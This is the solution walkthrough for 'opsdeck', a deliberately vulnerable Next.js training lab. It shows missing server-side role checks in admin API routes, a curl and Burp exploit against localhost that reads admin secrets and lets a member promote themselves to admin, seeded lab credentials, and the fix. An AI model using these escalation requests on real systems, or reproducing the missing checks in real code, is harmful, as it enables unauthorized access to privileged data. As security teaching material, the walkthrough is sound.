# opsdeck: Solution / Walkthrough

![CWE-284](https://img.shields.io/badge/CWE--284-Broken%20Access%20Control-red?style=flat-square)
![Next.js](https://img.shields.io/badge/Node-Next.js-000000?style=flat-square&logo=nextdotjs&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**opsdeck is an intentionally vulnerable application built for security education.** It contains a deliberate [broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-284) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken access control is and *how*
to approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a Next.js Route Handler and point to the exact missing role check.
- Reproduce the exploit by hand, escalating from `member` to `admin`.
- Explain **why** hiding the Admin console in the UI protected nothing.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): vertical privilege
> escalation happens when an app lets a low-privilege user perform a
> high-privilege action because the *only* barrier was in the interface. The
> server never asked what role the caller holds.

<br>

## 🐛 The vulnerability

The role is stored in the database and returned by `GET /api/me`. The front end
reads it to decide what to *draw*. `src/components/site-header.tsx`:

```tsx
// The Admin console is only DRAWN for admins …
...(me?.role === 'admin' ? [{ href: '/admin', label: 'Admin', icon: ShieldCheck }] : []),
```

and `src/app/admin/page.tsx` refuses to *request* the data for non-admins:

```tsx
if (user?.role === 'admin') await loadAll();   // client-side guard
```

Both are presentation. The routes behind the console are the real surface, and
three of the four never look at the role. `src/app/api/admin/secrets/route.ts`:

```ts
export async function GET(request: NextRequest) {
  const auth = requireSession(request);        // ✅ a valid signed session exists…
  if (!auth.ok) return auth.response;

  // ⚠️ MISSING ROLE CHECK — the most sensitive data in the app goes to anyone
  // who is signed in and asks for it.
  return json({ secrets: await listSecrets() });
}
```

`GET /api/admin/users` is identical. The write route is the dangerous one
(`src/app/api/admin/users/[id]/route.ts`):

```ts
export async function PATCH(request: NextRequest, context) {
  const auth = requireSession(request);        // authentication only …
  if (!auth.ok) return auth.response;

  // ⚠️ MISSING ROLE CHECK (write) — VERTICAL PRIVILEGE ESCALATION.
  const id = toId((await context.params).id);
  const role = (await readJson(request))?.role;     // validated: 'member' | 'admin'
  const user = await setUserRole(id, role);         // …but ANY user may set ANY role,
  return json({ user });                            //    including their own
}
```

Walk through it the way the server does:

1. `requireSession` verifies the HMAC on `opsdeck_session`. This is
   **authentication**, and it is sound — the session is signed and unforgeable.
2. Nothing then asks whether *this* user is an administrator. The role was never
   put in the session either, so the handler would have to look it up — and it
   doesn't.
3. The request body is validated (`role` must be `member` or `admin`), so this is
   not about malformed input — `admin` is a perfectly valid value.
4. The update runs. The caller just changed their own role.

And here is the contrast that makes the bug obvious in review.
`src/app/api/admin/services/[id]/route.ts` does it right:

```ts
const admin = await requireAdmin(request);     // ✅ session AND role === 'admin', from the DB
if (!admin.ok) return admin.response;          //    → 403 for a member
```

The team knew how to enforce it. They applied it **by hand, route by route**, and
forgot three of them.

> **Why does it look safe?** Every honest member goes through the UI, which never
> offers them these actions. Nobody tested the admin routes *with a member's
> cookie*.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`), an on-call *member*.

```bash
# 1) Log in as alice and save the session cookie.
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login
# {"ok":true,"user":{"id":1,"username":"alice","displayName":"Alice Martins","role":"member"}}

# 2) Your role, as the server knows it. This is what the UI uses to hide the Admin link.
curl -s -b jar.txt http://localhost:3000/api/me
# {"user":{"id":1,"username":"alice","displayName":"Alice Martins","role":"member","team":"Platform"}}
```

Now ignore the UI and call what the admin console calls. First, a route that
*does* enforce the role — to see what a refusal looks like:

```bash
# 3) CONTRAST — the route that checks the role refuses you.
curl -s -b jar.txt -X PATCH -H 'Content-Type: application/json' \
  -d '{"status":"outage"}' http://localhost:3000/api/admin/services/1
# {"error":"admin role required"}      ← HTTP 403
```

Then the ones that don't:

```bash
# 4) READ — the staff directory with roles. No 403 this time.
curl -s -b jar.txt http://localhost:3000/api/admin/users
# {"users":[{"id":1,"username":"alice","role":"member",...},{"id":2,"username":"bob","role":"admin",...}]}

# 5) READ — the break-glass credentials. The flag is in plain sight.
curl -s -b jar.txt http://localhost:3000/api/admin/secrets
```

Expected output (step 5), trimmed:

```json
{
  "secrets": [
    {
      "id": 1,
      "name": "break-glass-token",
      "value": "FLAG{OPSDECK_HIDDEN_ADMIN}",
      "description": "Emergency super-admin token. Use only when SSO is down. Rotate after use."
    },
    { "name": "grafana-service-key", "value": "glsa_..." },
    { "name": "pagerduty-routing-key", "value": "R0UT1NGK3Y-..." }
  ]
}
```

Reading was enough for the flag. The write route proves the damage is total —
you can **become** an administrator:

```bash
# 6) WRITE — promote yourself. The role you want is a valid field value.
curl -s -b jar.txt -X PATCH -H 'Content-Type: application/json' \
  -d '{"role":"admin"}' http://localhost:3000/api/admin/users/1

# 7) /api/me now agrees — and so does the UI, from this point on.
curl -s -b jar.txt http://localhost:3000/api/me
# {"user":{...,"role":"admin",...}}

# 8) The route that USED to refuse you now works, with the exact same session.
curl -s -b jar.txt -X PATCH -H 'Content-Type: application/json' \
  -d '{"status":"operational"}' http://localhost:3000/api/admin/services/1
```

> **Where does the flag come from?** It is **not** in the repo on purpose — it is
> baked into the Docker image at build time (`ARG FLAG`) and the seed writes it
> as the value of the `break-glass-token` secret. You have to actually reach an
> admin-only route against the running app to read it; you can't grep the
> source.

<br>

## 🚀 Going further

Seeded staff: `alice` / `password123` (member, Platform), `bob` /
`correct-horse-battery-staple` (admin, Infrastructure), `carol` /
`hunter2hunter2` (member, Payments).

Once you have promoted yourself, you hold every capability the real
administrator does — demote `bob`, rotate nothing (there is no rotate button,
but you've read the secret), or re-run step 6 with `{"role":"member"}` on your
own account to reset cleanly. Restarting the container also resets every role,
since the seed re-applies the starting state on every boot.

Notice what stayed constant through the whole exploit: your **session token**.
You never forged anything — the same cookie that said "member" before step 6
says "admin" after it, because the server, not the token, decides your role on
each request. The vulnerability was never in the session; it was in which
routes bothered to ask it the right question.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and sign in as `alice` at
   <http://localhost:3000>. Browse the Overview and Incidents pages — note that
   the nav bar never offers "Admin". Find `GET /api/me` in **Proxy > HTTP
   history** and confirm the response says `"role":"member"`.
2. Guess the admin API's shape from the console's purpose (`/api/admin/users`,
   `/api/admin/secrets` are the obvious names for "manage people" and "view
   credentials"). Send a `GET /api/admin/secrets` request from scratch in
   **Repeater**, reusing alice's session cookie. A `200` with real-looking
   secrets is the finding.
3. Build a `PATCH /api/admin/users/1` request with body `{"role":"admin"}` and
   the same cookie. Send it, then replay `GET /api/me` — the role changed.
4. For contrast, send `PATCH /api/admin/services/1` with a member's cookie
   *before* promoting — note the `403`. That is what the fix should make the
   others do too.

> Testing vertical escalation well means taking **every URL a high-privilege
> role would call** and replaying it with a **low-privilege session** — not just
> clicking through the UI as each role.

<br>

## 🛡️ The fix

Give every admin route the same guard the working one already has — check the
role, on the server, from data the client cannot set:

```ts
// lib/api.ts — already exists; it just wasn't used everywhere.
export async function requireAdmin(request: NextRequest) {
  const auth = requireSession(request);
  if (!auth.ok) return auth;
  const user = await findUserById(auth.session.userId);
  if (!user) return { ok: false, response: error('authentication required', 401) };
  if (user.role !== 'admin') return { ok: false, response: error('admin role required', 403) };
  return { ok: true, user };
}

// admin/secrets/route.ts — the fix is this one line.
export async function GET(request: NextRequest) {
  const admin = await requireAdmin(request);   // ✅ now it actually checks
  if (!admin.ok) return admin.response;
  return json({ secrets: await listSecrets() });
}
```

Apply `requireAdmin` to `GET /api/admin/users` and `PATCH /api/admin/users/:id`
too. For the role-change route specifically, add one more rule: an admin should
not be able to demote the **last remaining admin**, or every account could be
locked out of the console at once.

For defence in depth, make the check structural rather than a per-route habit: a
middleware that matches `/api/admin/*` and runs `requireAdmin` before any
handler executes, so a new route under that path is protected by default instead
of by memory.

Why this works: the role now comes from the **database**, verified on **every**
request, for **every** route under `/admin`. The UI can keep hiding the link —
that's good UX — but it stops being the only thing standing in the way.

### ⚠️ Tempting fixes that *don't* work

- **"The Admin link isn't in the menu for members."** That's the bug description,
  not a fix. Burp doesn't read your navigation bar.
- **Returning a generic error page / redirecting members who hit `/admin`.**
  That's still client-side — it changes what the *page* shows, not what the
  *API* allows. The routes above are reachable directly regardless.
- **Checking the role only on the page component (`admin/page.tsx`).** React
  runs in the browser the attacker controls. Anything decided there can be
  skipped by calling the API directly.
- **Putting the role inside the session token.** Better than nothing, but now a
  role change requires re-issuing the token, and a stale/cached token could
  grant privileges that were since revoked. Prefer re-reading the role from the
  database per request (what `requireAdmin` does here).
- **Obscuring the admin routes' names.** `/api/admin/*` being guessable was
  never the vulnerability — even an unguessable path is reachable by anyone who
  intercepts one legitimate admin request.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **A hidden button is not a security control.** Anything decided in the
   browser can be skipped by calling the API directly.
2. **Authorization must be enforced on the server, on every privileged route,
   every time.** Not once in a menu component.
3. **One correct route does not imply the rest are correct.** Grep for every
   handler that is *supposed* to require a role and verify each one actually
   calls the check.
4. **Vertical escalation is often one HTTP request away** once you know the
   shape of the admin API — you rarely need to "hack" anything beyond sending
   the right method to the right path.
5. **Test every privileged action with a low-privilege session.** If the UI
   never offers it, that is exactly the request you must send by hand.

That's Level 8 — vertical privilege escalation via a UI-only role check.
Previously, **[cartora (Level 7)](https://github.com/iv0ks/cartora)** showed a
server trusting a client-supplied *identity*. Next in the series,
**[vaultpass (Level 9)](https://github.com/iv0ks/vaultpass)** goes one layer
deeper: the identity itself is carried in a **JWT claim** the client can
manipulate. Head back to the **[Learning Guide](GUIDE.md)** for the method, or
the **[README](README.md)** for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
